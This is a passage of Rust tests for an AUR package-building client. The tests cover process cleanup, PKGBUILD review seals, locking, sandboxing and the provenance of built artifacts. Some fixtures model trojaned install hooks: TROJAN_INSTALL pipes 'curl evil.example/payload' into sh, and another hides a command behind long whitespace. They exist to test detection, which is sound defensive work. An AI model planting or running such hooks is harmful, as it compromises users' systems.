        assert!(format!("{error:#}").contains("remains present or unreaped"));
        assert!(child.try_wait()?.is_none(), "the child must still be alive");
        Ok(())
    }

    #[tokio::test]
    async fn native_probe_rejects_echild_while_pid_still_exists() {
        let error = reap_native_probe_child(nix::unistd::getpid(), Duration::from_millis(100))
            .await
            .expect_err("ECHILD must never certify a present process as reaped");
        assert!(format!("{error:#}").contains("remains present or unreaped"));
    }

    #[tokio::test]
    async fn native_build_timeout_terminates_descendants() -> Result<()> {
        native_build_cleanup_probe("timeout").await
    }

    #[tokio::test]
    async fn native_build_capture_failure_terminates_descendants() -> Result<()> {
        native_build_cleanup_probe("capture").await
    }

    #[tokio::test]
    async fn native_build_cancellation_terminates_descendants() -> Result<()> {
        native_build_cleanup_probe("cancel").await
    }

    #[tokio::test]
    async fn native_build_delayed_startup_cancellation_terminates_descendants() -> Result<()> {
        native_build_cleanup_probe("cancel-delayed").await
    }

    #[tokio::test]
    async fn native_build_startup_failure_reports_exit_status() -> Result<()> {
        native_build_cleanup_probe("startup-failure").await
    }

    #[tokio::test]
    async fn native_build_preserves_exit_status() -> Result<()> {
        native_build_cleanup_probe("status").await
    }

    #[test]
    fn reviewed_pkgbuild_digest_rejects_changed_bytes() {
        let directory = tempfile::tempdir().expect("temporary build directory");
        let path = directory.path().join("PKGBUILD");
        let reviewed = b"pkgname=example\npkgver=1\n";
        std::fs::write(&path, reviewed).expect("write reviewed PKGBUILD");
        let digest = pkgbuild_digest(reviewed);

        verify_reviewed_pkgbuild(&path, &digest).expect("unchanged PKGBUILD must match");
        std::fs::write(&path, b"pkgname=other\npkgver=1\n").expect("replace PKGBUILD");
        let error = verify_reviewed_pkgbuild(&path, &digest)
            .expect_err("changed PKGBUILD must fail its review seal");
        assert!(error.to_string().contains("changed after review"));
    }

    #[test]
    fn no_makepkg_invocation_can_install_dependencies() {
        let client = AurClient::new().expect("test settings must load");
        for args in [client.makepkg_args(), client.makepkg_args_sandbox()] {
            assert!(
                !args.iter().any(|arg| matches!(*arg, "-s" | "--syncdeps")),
                "sourcing a PKGBUILD must never run with dependency-install privileges"
            );
        }
    }

    #[tokio::test]
    async fn dependency_plan_refuses_missing_srcinfo() {
        let directory = tempfile::tempdir().expect("temporary build directory");
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let source = ReviewedSource {
            files: std::collections::BTreeMap::new(),
            digest: String::new(),
            parsed_srcinfo: OnceLock::new(),
        };
        let error = client
            .aur_dependency_plan(&source, "example", &["example".to_string()])
            .await
            .expect_err("missing .SRCINFO must fail before PKGBUILD execution");
        assert!(error.to_string().contains("has no regular .SRCINFO"));
    }

    #[test]
    fn reviewed_source_optional_metadata_preserves_absence_and_parse_errors() -> Result<()> {
        let mut source = ReviewedSource {
            files: std::collections::BTreeMap::new(),
            digest: String::new(),
            parsed_srcinfo: OnceLock::new(),
        };
        assert!(source.optional_srcinfo()?.is_none());
        source.files.insert(
            PathBuf::from(".SRCINFO"),
            b"\tnonsense-key with no value structure\n".to_vec(),
        );
        assert!(
            format!(
                "{:#}",
                source.optional_srcinfo().expect_err("malformed metadata")
            )
            .contains("Failed to parse .SRCINFO")
        );
        Ok(())
    }

    #[test]
    fn reviewed_dependency_consumers_use_captured_metadata_after_checkout_changes() -> Result<()> {
        const TEST: &str = "package_managers::aur::client::tests::reviewed_dependency_consumers_use_captured_metadata_after_checkout_changes";
        if crate::core::testing::run_isolated_test(TEST) || Settings::rerun_test_unprivileged(TEST)
        {
            return Ok(());
        }
        let fixture = S72Fixture::new(&[])?;
        std::fs::create_dir_all(fixture.db.join("local"))?;
        std::fs::write(fixture.db.join("local/ALPM_DB_VERSION"), "9\n")?;
        std::fs::write(fixture.directory.path().join("PKGBUILD"), "pkgname=demo\n")?;
        let path = fixture.directory.path().join(".SRCINFO");
        std::fs::write(
            &path,
            "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = demo\n",
        )?;
        let source = ReviewedSource::capture(fixture.directory.path())?;
        std::fs::write(
            &path,
            "pkgbase = demo\npkgver = 1\npkgrel = 1\narch = any\npkgname = replacement\n",
        )?;
        fixture.with_environment(async {
            tokio::task::yield_now().await;
            let client = fixture.client();
            let plan = client
                .aur_dependency_plan(&source, "demo", &["demo".to_owned()])
                .await?;
            assert_eq!(plan.package_outputs, ["demo"]);
            client
                .ensure_dependencies_satisfied(&source, &plan.package_outputs)
                .await?;
            Ok(())
        })
    }

    #[test]
    fn recursive_dependency_builds_reject_cycles() {
        let mut in_flight = AHashSet::from_iter(["root-package".to_string()]);

        let error = AurClient::enter_dependency_build(&mut in_flight, "root-package")
            .expect_err("an in-flight package must be rejected");

        assert!(error.to_string().contains("Circular AUR dependency"));
        AurClient::enter_dependency_build(&mut in_flight, "leaf-package")
            .expect("a new dependency should enter the build set");

        let base_marker = AurClient::package_base_marker("root-base");
        in_flight.insert(base_marker);
        let error = AurClient::enter_package_base(&mut in_flight, "root-base")
            .expect_err("a split output must not re-enter its package base");
        assert!(
            error
                .to_string()
                .contains("Circular AUR package-base dependency")
        );
    }

    #[tokio::test]
    async fn lifecycle_lease_excludes_cleanup_until_all_builds_finish() {
        use std::os::unix::fs::MetadataExt;
        let directory = tempfile::tempdir().unwrap();
        let client = AurClient {
            build_dir: directory.path().join("aur"),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let first = client.acquire_build_lifecycle().await.unwrap();
        let second = client.acquire_build_lifecycle().await.unwrap();
        std::fs::create_dir_all(&client.build_dir).unwrap();
        let marker = client.build_dir.join("active-build");
        std::fs::write(&marker, b"in progress").unwrap();
        assert!(client.clean_all().is_err());
        assert!(marker.exists());
        drop(first);
        assert!(client.clean_all().is_err());
        drop(second);
        let lock_path = directory.path().join("aur.lifecycle.lock");
        let inode = lock_path.metadata().unwrap().ino();
        client.clean_all().unwrap();
        assert!(!marker.exists());
        assert_eq!(lock_path.metadata().unwrap().ino(), inode);
        let cleanup = client.open_lifecycle_lock().unwrap();
        cleanup.try_lock().unwrap();
        assert!(client.acquire_build_lifecycle().await.is_err());
        drop(cleanup);
        assert!(client.acquire_build_lifecycle().await.is_ok());
    }

    #[tokio::test]
    async fn cancelled_blocking_work_keeps_cache_lease_until_completion() {
        let directory = tempfile::tempdir().unwrap();
        let client = AurClient {
            build_dir: directory.path().join("aur"),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let worker_client = client.clone();
        let (started_tx, started_rx) = tokio::sync::oneshot::channel();
        let (release_tx, release_rx) = std::sync::mpsc::channel();
        let (completed_tx, completed_rx) = tokio::sync::oneshot::channel::<()>();
        let worker = tokio::spawn(async move {
            worker_client
                .blocking_build_work(move || {
                    started_tx.send(()).unwrap();
                    release_rx.recv().unwrap();
                    Ok(completed_tx)
                })
                .await
        });
        started_rx.await.unwrap();
        worker.abort();
        assert!(worker.await.unwrap_err().is_cancelled());
        let cleanup_while_running = client.clean_all();
        release_tx.send(()).unwrap();
        // A dropped blocking task result releases this sender after its lease.
        assert!(completed_rx.await.is_err());
        assert!(
            cleanup_while_running.is_err(),
            "cleanup removed an active blocking job's cache"
        );
        client.clean_all().unwrap();
    }

    #[test]
    fn lifecycle_lock_rejects_links() {
        let directory = tempfile::tempdir().unwrap();
        let client = AurClient {
            build_dir: directory.path().join("aur"),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let target = directory.path().join("target");
        let lock = directory.path().join("aur.lifecycle.lock");
        std::fs::write(&target, b"unchanged").unwrap();
        std::os::unix::fs::symlink(&target, &lock).unwrap();
        assert!(client.open_lifecycle_lock().is_err());
        std::fs::remove_file(&lock).unwrap();
        std::fs::hard_link(&target, &lock).unwrap();
        assert!(client.open_lifecycle_lock().is_err());
        assert_eq!(std::fs::read(&target).unwrap(), b"unchanged");
    }

    #[test]
    fn rollback_worktrees_are_unique_for_the_same_package_base() -> Result<()> {
        let work = tempfile::tempdir()?;
        let first = AurClient::begin_rollback_worktree(work.path(), "example")?;
        let second = AurClient::begin_rollback_worktree(work.path(), "example")?;
        assert!(
            first
                .path()
                .file_name()
                .unwrap()
                .to_string_lossy()
                .starts_with("example-")
        );
        assert!(
            second
                .path()
                .file_name()
                .unwrap()
                .to_string_lossy()
                .starts_with("example-")
        );
        assert_ne!(first.path(), second.path());
        drop(first);
        assert!(second.path().is_dir());
        Ok(())
    }

    #[test]
    fn rollback_failure_removes_its_checkout() -> Result<()> {
        let work = tempfile::tempdir()?;
        let attempt = || -> Result<()> {
            let checkout = AurClient::begin_rollback_worktree(work.path(), "example")?;
            std::fs::write(checkout.path().join("PKGBUILD"), b"partial clone")?;
            anyhow::bail!("historical version not found");
        };
        assert!(attempt().is_err());
        assert_eq!(
            std::fs::read_dir(work.path())?.count(),
            0,
            "failed checkout must not leak"
        );
        Ok(())
    }

    #[tokio::test]
    async fn rollback_cancellation_preserves_other_checkouts_and_logs() -> Result<()> {
        let root = tempfile::tempdir()?;
        let work = root.path().join("_rollback");
        let logs = root.path().join("_logs");
        std::fs::create_dir_all(&work)?;
        std::fs::create_dir_all(&logs)?;
        let log = logs.join("example.log");
        std::fs::write(&log, b"diagnostic evidence")?;
        let surviving = AurClient::begin_rollback_worktree(&work, "example")?;
        let cancelled = AurClient::begin_rollback_worktree(&work, "example")?;
        let cancelled_path = cancelled.path().to_path_buf();
        std::fs::write(cancelled.path().join("PKGBUILD"), b"partial")?;
        let (ready, started) = tokio::sync::oneshot::channel();
        let task = tokio::spawn(async move {
            let _checkout = cancelled;
            let _ = ready.send(());
            std::future::pending::<()>().await;
        });
        started.await?;
        task.abort();
        assert!(task.await.expect_err("cancelled rollback").is_cancelled());
        assert!(!cancelled_path.exists());
        assert!(surviving.path().is_dir());
        assert_eq!(std::fs::read(log)?, b"diagnostic evidence");
        Ok(())
    }

    #[test]
    fn rollback_errors_do_not_contain_literal_escape_text() {
        let not_found = historical_version_not_found_message("example", "1.0-1");
        assert!(!not_found.contains('\\'));

        let build_failed = AurClient::historical_build_failure_message(
            "example",
            "1.0-1",
            Path::new("/var/log/omg/example.log"),
        );
        assert!(build_failed.contains('\n'));
        assert!(!build_failed.contains("\\n"));
        assert!(!build_failed.contains("\\\\"));
    }

    #[tokio::test]
    async fn cleanup_preserves_active_builds_and_the_lifecycle_inode() -> Result<()> {
        use std::os::unix::fs::MetadataExt;

        let directory = tempfile::tempdir()?;
        let client = AurClient {
            build_dir: directory.path().join("aur"),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let checkout = client.build_dir.join("fixture");
        std::fs::create_dir_all(&checkout)?;
        std::fs::write(checkout.join("PKGBUILD"), b"reviewed source")?;
        std::fs::write(
            checkout.join(".SRCINFO"),
            b"pkgbase = fixture\npkgver = 1\npkgrel = 1\narch = any\npkgname = fixture\n",
        )?;
        let first = AuthorizedBuild {
            lifecycle_guard: client.acquire_build_lifecycle().await?,
            package: "fixture".into(),
            requested_outputs: vec!["fixture".into()],
            reviewed_digest: ReviewedSource::capture(&checkout)?,
        };
        let second = client.clone().acquire_build_lifecycle().await?;
        let lifecycle_path = client.build_dir.with_added_extension("lifecycle.lock");
        let inode = std::fs::metadata(&lifecycle_path)?.ino();
        let package_guard = client.acquire_package_base_file_lock("fixture").await?;
        let package_inode = package_guard.metadata()?.ino();
        let source = checkout.join("PKGBUILD");

        assert!(
            client.clean_all().is_err(),
            "cleanup must reject active builders"
        );
        assert_eq!(std::fs::read(&source)?, b"reviewed source");
        assert_eq!(
            std::fs::metadata(client.build_dir.join("_locks/fixture.lock"))?.ino(),
            package_inode
        );
        drop(package_guard);
        drop(first);
        assert!(
            client.clean_all().is_err(),
            "remaining shared owner must still block cleanup"
        );
        drop(second);

        client.clean_all()?;
        assert!(client.build_dir.is_dir());
        assert_eq!(std::fs::read_dir(&client.build_dir)?.count(), 0);
        assert_eq!(std::fs::metadata(&lifecycle_path)?.ino(), inode);
        let _next_build = client.acquire_build_lifecycle().await?;
        assert!(
            client.clean_all().is_err(),
            "a new build must use the same lock inode"
        );
        Ok(())
    }

    #[tokio::test]
    async fn cleanup_ownership_blocks_new_builds_and_other_cleaners() -> Result<()> {
        let directory = tempfile::tempdir()?;
        let client = AurClient {
            build_dir: directory.path().join("aur"),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let cleaner = client.open_lifecycle_lock()?;
        cleaner.try_lock()?;
        assert!(client.acquire_build_lifecycle().await.is_err());
        assert!(client.clean_all().is_err());
        assert!(!client.build_dir.exists());
        drop(cleaner);
        let _builder = client.acquire_build_lifecycle().await?;
        Ok(())
    }

    #[tokio::test]
    async fn cancelled_build_releases_cleanup_ownership() -> Result<()> {
        if crate::core::testing::run_isolated_test(
            "package_managers::aur::client::tests::cancelled_build_releases_cleanup_ownership",
        ) {
            return Ok(());
        }
        let directory = tempfile::tempdir()?;
        let client = AurClient {
            build_dir: directory.path().join("aur"),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let guard = client.acquire_build_lifecycle().await?;
        std::fs::create_dir_all(&client.build_dir)?;
        std::fs::write(client.build_dir.join("partial"), b"partial")?;
        let (ready, started) = tokio::sync::oneshot::channel();
        let task = tokio::spawn(async move {
            let _guard = guard;
            let _ = ready.send(());
            std::future::pending::<()>().await;
        });
        started.await?;
        assert!(client.clean_all().is_err());
        task.abort();
        assert!(task.await.expect_err("cancelled build task").is_cancelled());
        client.clean_all()?;
        assert_eq!(std::fs::read_dir(&client.build_dir)?.count(), 0);
        Ok(())
    }

    #[test]
    fn lifecycle_lock_rejects_symlinks_and_hardlinks() -> Result<()> {
        let directory = tempfile::tempdir()?;
        let client = AurClient {
            build_dir: directory.path().join("aur"),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let target = directory.path().join("unrelated");
        std::fs::write(&target, b"keep")?;
        let lock_path = client.build_dir.with_added_extension("lifecycle.lock");
        std::os::unix::fs::symlink(&target, &lock_path)?;
        assert!(client.open_lifecycle_lock().is_err());
        std::fs::remove_file(&lock_path)?;
        std::fs::hard_link(&target, &lock_path)?;
        assert!(client.open_lifecycle_lock().is_err());
        assert_eq!(std::fs::read(target)?, b"keep");
        Ok(())
    }

    #[tokio::test]
    async fn package_base_file_locks_live_under_the_build_directory() {
        let directory = tempfile::tempdir().unwrap();
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };

        let guard = client
            .acquire_package_base_file_lock("shared-base")
            .await
            .expect("package-base file lock");

        assert!(directory.path().join("_locks/shared-base.lock").is_file());
        drop(guard);
    }

    #[test]
    fn cloned_clients_serialize_work_for_the_same_package_base() {
        let directory = tempfile::tempdir().unwrap();
        let client = AurClient {
            build_dir: directory.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let cloned = client.clone();

        let first = client.package_base_lock("shared-base");
        let second = cloned.package_base_lock("shared-base");
        let unrelated = cloned.package_base_lock("unrelated-base");
        assert!(Arc::ptr_eq(&first, &second));
        assert!(!Arc::ptr_eq(&first, &unrelated));

        let guard = first.try_lock().expect("first package-base lock");
        assert!(second.try_lock().is_err());
        assert!(unrelated.try_lock().is_ok());
        drop(guard);
        assert!(second.try_lock().is_ok());
    }

    #[test]
    fn sandbox_cache_mounts_include_configured_compiler_caches() {
        let directory = tempfile::tempdir().unwrap();
        let cache_base = directory.path().join("cache");
        let ccache = cache_base.join("ccache");
        let sccache = cache_base.join("sccache");
        std::fs::create_dir_all(&ccache).unwrap();
        std::fs::create_dir_all(&sccache).unwrap();

        let mounts = AurClient::sandbox_cache_mounts(&cache_base, &[ccache, sccache]).unwrap();

        assert_eq!(
            mounts,
            vec![cache_base.join("ccache"), cache_base.join("sccache")]
        );

        let outside = directory.path().join("outside");
        std::fs::create_dir(&outside).unwrap();
        assert!(AurClient::sandbox_cache_mounts(&cache_base, &[outside]).is_err());
    }

    #[tokio::test]
    async fn test_makepkg_env_sanitization() {
        let client = AurClient::new().expect("test settings must load");
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = dir.path().join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");

        let env = client
            .makepkg_env(&pkg_dir)
            .await
            .expect("makepkg env must be constructed");
        assert!(
            env.builddir.starts_with(paths::cache_dir()),
            "build dir must live under the omg cache directory, got {}",
            env.builddir.display()
        );
        assert!(
            !env.builddir.starts_with(std::env::temp_dir()),
            "build dir must never be under world-writable /tmp, got {}",
            env.builddir.display()
        );
        assert!(
            env.builddir.ends_with("mypkg"),
            "build dir must be named after the package, got {}",
            env.builddir.display()
        );
    }

    #[test]
    fn cache_key_binds_auxiliary_files() {
        let dir = tempfile::tempdir().unwrap();
        let client = AurClient {
            build_dir: dir.path().join("build"),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        std::fs::write(dir.path().join("PKGBUILD"), "pkgname=demo\n").unwrap();
        std::fs::write(dir.path().join(".SRCINFO"), "pkgbase = demo\n").unwrap();
        std::fs::write(dir.path().join("fix.patch"), "original").unwrap();
        let before = client.cache_key(dir.path(), "").unwrap();
        assert_eq!(before, client.cache_key(dir.path(), "").unwrap());
        std::fs::write(dir.path().join("fix.patch"), "modified").unwrap();
        assert_ne!(before, client.cache_key(dir.path(), "").unwrap());
        std::fs::write(dir.path().join("fix.patch"), "original").unwrap();
        assert_eq!(before, client.cache_key(dir.path(), "").unwrap());
    }

    #[tokio::test]
    async fn makepkg_invocations_isolate_every_writable_cache() {
        let mut client = AurClient::new().unwrap();
        let dir = tempfile::tempdir().unwrap();
        client.settings.aur.enable_ccache = true;
        client.settings.aur.enable_sccache = true;
        client.settings.aur.pkgdest = Some(dir.path().to_owned());
        client.settings.aur.srcdest = Some(dir.path().to_owned());
        client.settings.aur.ccache_dir = Some(dir.path().to_owned());
        client.settings.aur.sccache_dir = Some(dir.path().to_owned());
        let first = client.makepkg_env(dir.path()).await.unwrap();
        let second = client.makepkg_env(dir.path()).await.unwrap();
        for (left, right) in [
            (&first.pkgdest, &second.pkgdest),
            (&first.srcdest, &second.srcdest),
            (&first.builddir, &second.builddir),
        ] {
            assert_ne!(left, right);
            assert!(!left.starts_with(dir.path()));
        }
        for left in &first.compiler_cache_dirs {
            assert!(!second.compiler_cache_dirs.contains(left));
            assert!(!left.starts_with(dir.path()));
        }
        let old_output = first.pkgdest.clone();
        drop(first);
        assert!(!old_output.exists());
    }

    #[test]
    fn invocation_ownership_setup_uses_only_private_directory_handles() -> Result<()> {
        use std::os::unix::fs::{MetadataExt, PermissionsExt};
        let directory = tempfile::Builder::new()
            .permissions(std::fs::Permissions::from_mode(0o700))
            .tempdir()?;
        prepare_invocation_directory(directory.path(), None)?;
        let metadata = std::fs::metadata(directory.path())?;
        assert_eq!(metadata.mode() & 0o777, 0o700);
        let outside = tempfile::tempdir()?;
        std::fs::set_permissions(outside.path(), std::fs::Permissions::from_mode(0o755))?;
        assert!(prepare_invocation_directory(outside.path(), None).is_err());
        let link = directory.path().join("linked-directory");
        std::os::unix::fs::symlink(outside.path(), &link)?;
        assert!(prepare_invocation_directory(&link, None).is_err());
        if nix::unistd::geteuid().is_root() {
            let account = nix::unistd::User::from_name("nobody")?
                .context("root ownership regression needs an unprivileged nobody account")?;
            prepare_invocation_directory(directory.path(), Some((account.uid, account.gid)))?;
            let metadata = std::fs::metadata(directory.path())?;
            assert_eq!(metadata.uid(), account.uid.as_raw());
            assert_eq!(metadata.gid(), account.gid.as_raw());
            assert_eq!(metadata.mode() & 0o777, 0o700);
        }
        Ok(())
    }

    #[tokio::test]
    async fn chroot_requires_explicit_host_code_consent_before_launch() -> Result<()> {
        let mut client = AurClient::new()?;
        client.settings.aur.allow_network = true;
        client.settings.aur.allow_unsafe_builds = false;
        let checkout = tempfile::tempdir()?;
        let env = client.makepkg_env(checkout.path()).await?;
        let error = client
            .run_chroot_build(checkout.path(), &env, "demo")
            .await
            .expect_err("network consent alone cannot authorize host recipe execution");
        assert!(error.to_string().contains("aur.allow_unsafe_builds"));
        Ok(())
    }

    #[test]
    fn install_hook_review_fails_closed_and_preserves_long_lines() {
        let mut source = ReviewedSource {
            files: std::collections::BTreeMap::from([(
                PathBuf::from(".SRCINFO"),
                b"install = demo.install\n".to_vec(),
            )]),
            digest: String::new(),
            parsed_srcinfo: OnceLock::new(),
        };
        assert!(declared_install_hook_previews(&source).is_err());
        source.files.insert(
            PathBuf::from("demo.install"),
            vec![b'x'; MAX_PKGBUILD_REVIEW_BYTES + 1],
        );
        assert!(declared_install_hook_previews(&source).is_err());
        source
            .files
            .insert(PathBuf::from("demo.install"), vec![0xff]);
        assert!(declared_install_hook_previews(&source).is_err());
        let hook = format!("{}; touch /root/hidden-payload", " ".repeat(150));
        source
            .files
            .insert(PathBuf::from("demo.install"), hook.as_bytes().to_vec());
        let hooks = declared_install_hook_previews(&source).unwrap();
        let panel = pkgbuild_review_panel(
            "demo",
            "digest",
            "pkgname=demo",
            Path::new("PKGBUILD"),
            &[],
            &hooks,
            false,
        );
        assert!(panel.contains("touch /root/hidden-payload"));
    }

    #[tokio::test]
    async fn fresh_outputs_never_fall_back_to_checkout_or_other_invocations() {
        let client = AurClient::new().unwrap();
        let checkout = tempfile::tempdir().unwrap();
        let first = client.makepkg_env(checkout.path()).await.unwrap();
        let second = client.makepkg_env(checkout.path()).await.unwrap();
        let write_archive = |directory: &Path, name: &str| {
            let path = directory.join(format!("{name}-1-1-any.pkg.tar.zst"));
            let encoder = zstd::Encoder::new(File::create(&path).unwrap(), 0).unwrap();
            let mut archive = tar::Builder::new(encoder);
            let info = format!("pkgname = {name}\npkgver = 1-1\npkgbase = demo\narch = any\n");
            let mut header = tar::Header::new_gnu();
            header.set_size(info.len() as u64);
            header.set_cksum();
            archive
                .append_data(&mut header, ".PKGINFO", info.as_bytes())
                .unwrap();
            archive.into_inner().unwrap().finish().unwrap();
            path
        };
        let poison = write_archive(checkout.path(), "demo");
        write_archive(&first.pkgdest, "demo");
        let names = ["demo".to_string()];
        assert!(
            AurClient::find_built_packages(checkout.path(), &second.pkgdest, &names)
                .await
                .is_err()
        );
        std::os::unix::fs::symlink(&poison, second.pkgdest.join(poison.file_name().unwrap()))
            .unwrap();
        assert!(
            AurClient::find_built_packages(checkout.path(), &second.pkgdest, &names)
                .await
                .is_err()
        );
        std::fs::remove_file(second.pkgdest.join(poison.file_name().unwrap())).unwrap();
        let genuine = write_archive(&second.pkgdest, "demo");
        assert_eq!(
            AurClient::find_built_packages(checkout.path(), &second.pkgdest, &names)
                .await
                .unwrap(),
            vec![genuine]
        );
        let split = ["demo".to_string(), "libs".to_string()];
        write_archive(&first.pkgdest, "libs");
        assert!(
            AurClient::find_built_packages(checkout.path(), &second.pkgdest, &split)
                .await
                .is_err()
        );
        write_archive(&second.pkgdest, "libs");
        assert_eq!(
            AurClient::find_built_packages(checkout.path(), &second.pkgdest, &split)
                .await
                .unwrap()
                .len(),
            2
        );
        drop(first); // A failed invocation's output tree cannot feed a later build.
        let later = client.makepkg_env(checkout.path()).await.unwrap();
        assert!(
            AurClient::find_built_packages(checkout.path(), &later.pkgdest, &names)
                .await
                .is_err()
        );
    }

    #[test]
    fn cache_key_requires_reviewable_srcinfo() {
        let client = AurClient::new().expect("test settings must load");
        let dir = tempfile::tempdir().expect("temp dir");
        let pkg_dir = dir.path().join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");
        std::fs::write(pkg_dir.join("PKGBUILD"), "pkgname=mypkg\n").expect("pkgbuild");

        client
            .cache_key(&pkg_dir, "")
            .expect_err("missing .SRCINFO must not produce a source cache identity");
    }

    #[test]
    fn cache_key_fails_when_srcinfo_is_unreadable() {
        use std::os::unix::fs::PermissionsExt;

        if crate::config::Settings::rerun_test_unprivileged(
            "package_managers::aur::client::tests::cache_key_fails_when_srcinfo_is_unreadable",
        ) {
            return;
        }
        assert!(
            !crate::core::is_root(),
            "permission fixture must not run as root"
        );

        let dir = tempfile::tempdir().expect("temp dir");
        let client = AurClient {
            build_dir: dir.path().to_path_buf(),
            settings: Settings::default(),
            package_base_locks: Arc::new(dashmap::DashMap::new()),
        };
        let pkg_dir = dir.path().join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");
        std::fs::write(pkg_dir.join("PKGBUILD"), "pkgname=mypkg\n").expect("pkgbuild");
        let srcinfo = pkg_dir.join(".SRCINFO");
        std::fs::write(&srcinfo, "pkgbase = mypkg\n").expect("srcinfo");
        let original = std::fs::metadata(&srcinfo)
            .expect("srcinfo metadata")
            .permissions();
        let mut permissions = original.clone();
        permissions.set_mode(0o000);
        std::fs::set_permissions(&srcinfo, permissions).expect("chmod");

        let result = client.cache_key(&pkg_dir, "");
        let denied = std::fs::read(&srcinfo).expect_err("fixture must enforce permission denial");
        assert_eq!(denied.kind(), std::io::ErrorKind::PermissionDenied);
        println!(
            "[omg-permission-fixture] test=package_managers::aur::client::tests::cache_key_fails_when_srcinfo_is_unreadable uid={} errno=PermissionDenied",
            nix::unistd::geteuid()
        );

        std::fs::set_permissions(&srcinfo, original).expect("restore chmod");

        let error = result.expect_err("unreadable .SRCINFO must fail closed");
        assert!(
            error.chain().any(|cause| cause
                .downcast_ref::<std::io::Error>()
                .is_some_and(|cause| cause.kind() == std::io::ErrorKind::PermissionDenied)),
            "production must retain the permission denial: {error:#}"
        );
    }

    #[test]
    fn srcinfo_version_extracts_pkgver_pkgrel() {
        let srcinfo = "pkgbase = postgresql18\n\
             pkgver = 18.4\n\
             pkgrel = 1\n\
             pkgdesc = PostgreSQL\n\
             \n\
             pkgname = postgresql18\n";
        assert_eq!(srcinfo_version(srcinfo).as_deref(), Some("18.4-1"));
        // First occurrences win over later split-package duplicates.
        let dup = "pkgver = 1.0\npkgrel = 2\npkgname = a\npkgver = 9.9\n";
        assert_eq!(srcinfo_version(dup).as_deref(), Some("1.0-2"));
        assert_eq!(srcinfo_version("pkgname = x"), None);
        // makepkg emits epoch after pkgver/pkgrel in the pkgbase section.
        assert_eq!(
            srcinfo_version("pkgver = 1.0~rc1\npkgrel = 3\nepoch = 2"),
            Some("2:1.0~rc1-3".to_string())
        );
    }

    // ── SEC-R2-01: cached-artifact provenance ────────────────────────────

    /// Build an architecture-independent fixture so provenance tests exercise
    /// the selected identity/hook defect rather than missing architecture.
    fn write_pkg_archive(path: &Path, pkginfo: &str, install: Option<&str>) {
        let pkginfo = format!("arch = any\n{pkginfo}");
        let field = |name: &str| {
            pkginfo
                .lines()
                .find_map(|line| line.strip_prefix(&format!("{name} = ")))
                .unwrap_or_else(|| panic!("fixture is missing {name}"))
        };
        let buildinfo = format!(
            "format = 2\npkgname = {}\npkgbase = {}\npkgver = {}\npkgarch = any\n",
            field("pkgname"),
            field("pkgbase"),
            field("pkgver")
        );
        let mut entries = vec![
            (".PKGINFO", pkginfo.as_bytes()),
            (".BUILDINFO", buildinfo.as_bytes()),
            (".MTREE", b"#mtree\n".as_slice()),
        ];
        if let Some(install) = install {
            entries.push((".INSTALL", install.as_bytes()));
        }
        write_tar_gz(path, &entries);
    }

    /// A reviewed checkout: `.SRCINFO` matching the PKGBUILD plus the
    /// install script it declares.
    fn provenance_pkg_dir(
        dir: &Path,
        srcinfo: &str,
        install_file: Option<(&str, &str)>,
    ) -> PathBuf {
        let pkg_dir = dir.join("mypkg");
        std::fs::create_dir(&pkg_dir).expect("pkg dir");
        let (base, rest) = srcinfo
            .split_once('\n')
            .expect("fixture starts with pkgbase");
        let srcinfo = format!("{base}\narch = any\n{rest}");
        std::fs::write(pkg_dir.join(".SRCINFO"), srcinfo).expect("srcinfo");
        if let Some((name, content)) = install_file {
            std::fs::write(pkg_dir.join(name), content).expect("install script");
        }
        pkg_dir
    }

    const LEGIT_INSTALL: &str = "pre_install() {\n  echo legit\n}\n";
    const TROJAN_INSTALL: &str = "pre_install() {\n  curl evil.example/payload | sh\n}\n";

    // Fixture-only code. The real archive reader and sealed output authorization
    // must enforce each requested output's declared architecture independently.
    fn assert_split_architecture_authorization(
        srcinfo: &str,
        requested: &[(&str, &str)],
        accepted: bool,
    ) -> Result<()> {
        assert!(
            !crate::core::is_root(),
            "archive fixture must use an ordinary UID"
        );
        let audit_dir = tempfile::tempdir()?;
        temp_env::with_var("OMG_DATA_DIR", Some(audit_dir.path()), || -> Result<()> {
            let source_dir = tempfile::tempdir()?;
            let archive_dir = tempfile::tempdir()?;
            let pkgbuild = b"pkgbase=split\npkgname=(app docs)\npkgver=1.0\npkgrel=1\n";
            std::fs::write(source_dir.path().join("PKGBUILD"), pkgbuild)?;
            std::fs::write(source_dir.path().join(".SRCINFO"), srcinfo)?;
            let mut paths = Vec::new();
            for (name, architecture) in requested {
                let archive = archive_dir
                    .path()
                    .join(format!("{name}-1.0-1-{architecture}.pkg.tar.gz"));
                let pkginfo = format!(
                    "pkgname = {name}\npkgbase = split\npkgver = 1.0-1\narch = {architecture}\n"
                );
                let buildinfo = format!(
                    "format = 2\npkgname = {name}\npkgbase = split\npkgver = 1.0-1\npkgarch = {architecture}\n"
                );
                write_tar_gz(
                    &archive,
                    &[
                        (".PKGINFO", pkginfo.as_bytes()),
                        (".BUILDINFO", buildinfo.as_bytes()),
                        (".MTREE", b"#mtree\n"),
                    ],
                );
                paths.push(archive);
            }
            let archive_before = paths
                .iter()
                .map(std::fs::read)
                .collect::<std::io::Result<Vec<_>>>()?;
            let source = ReviewedSource::capture(source_dir.path())?;
            let outputs = requested
                .iter()
